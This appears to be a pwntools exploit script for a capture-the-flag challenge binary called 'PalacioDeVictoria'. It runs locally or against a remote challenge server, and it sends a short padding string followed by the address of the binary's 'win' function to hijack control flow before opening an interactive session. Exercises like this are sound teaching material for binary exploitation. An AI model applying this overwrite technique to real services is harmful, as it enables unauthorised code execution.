from pwn import *

gs = '''
break *main+92
continue
'''

elf = context.binary = ELF("./PalacioDeVictoria")

def start():
    if args.REMOTE:
        return remote("54.224.65.7", 11111)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

io.recv()

io.sendline(b"AA" + p32(elf.sym.win))

io.interactive()
